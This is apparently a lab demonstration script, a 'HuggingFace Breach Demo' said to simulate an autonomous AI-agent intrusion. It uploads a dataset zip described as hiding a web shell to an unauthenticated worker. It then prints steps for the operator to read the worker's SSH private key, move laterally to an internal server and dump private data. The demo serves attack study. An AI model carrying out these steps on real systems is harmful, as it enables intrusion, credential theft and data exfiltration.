import requests, zipfile, os, time

WORKER_URL = "http://172.20.0.20:8080"

print("=" * 50)
print("HuggingFace Breach Demo")
print("Simulating July 2026 AI Agent autonomous intrusion")
print("=" * 50)

# Wait for Worker to be ready
print("\n[*] Waiting for Worker service...")
for i in range(10):
    try:
        r = requests.get(f"{WORKER_URL}/status", timeout=2)
        if r.status_code == 200:
            print("[+] Worker service is ready")
            break
    except:
        time.sleep(2)
        print(f"    Waiting... ({i+1}/10)")

# Step 1: Package malicious dataset as zip
print("\n[*] Step 1: Packaging malicious dataset...")
zip_path = "/tmp/malicious_dataset.zip"
with zipfile.ZipFile(zip_path, "w") as z:
    z.write("/attack/malicious_dataset/loading_script.py", "loading_script.py")
print(f"[+] Malicious dataset packaged: {zip_path}")
print("    Contents: loading_script.py (disguised as a dataset loader, actually a web shell)")

# Step 2: Upload to Worker (no authentication required)
print("\n[*] Step 2: Uploading malicious dataset to Worker...")
print(f"    Target: {WORKER_URL}/upload")
with open(zip_path, "rb") as f:
    r = requests.post(
        f"{WORKER_URL}/upload",
        files={"dataset": ("dataset.zip", f, "application/zip")}
    )
print(f"[+] Upload successful, Worker response: {r.status_code} - {r.text}")

# Step 3: Wait for reverse shell
print("\n[*] Step 3: Waiting for Worker to execute loading_script.py...")
print("    Worker is processing the dataset — loading_script.py will execute shortly")
print()
print("=" * 50)
print(">>> Switch to terminal 1 now — you should have a shell on the Worker!")
print()
print("Run the following commands to complete lateral movement:")
print()
print("  1. Confirm you are on the Worker:")
print("     hostname && whoami")
print()
print("  2. Find the SSH private key held by the Worker:")
print("     cat /root/.ssh/id_rsa")
print()
print("  3. SSH to the internal data server (172.20.0.30):")
print("     ssh -i /root/.ssh/id_rsa worker@172.20.0.30")
print()
print("  4. Exfiltrate internal data:")
print("     cat /internal/datasets/private_dataset.json")
print("=" * 50)
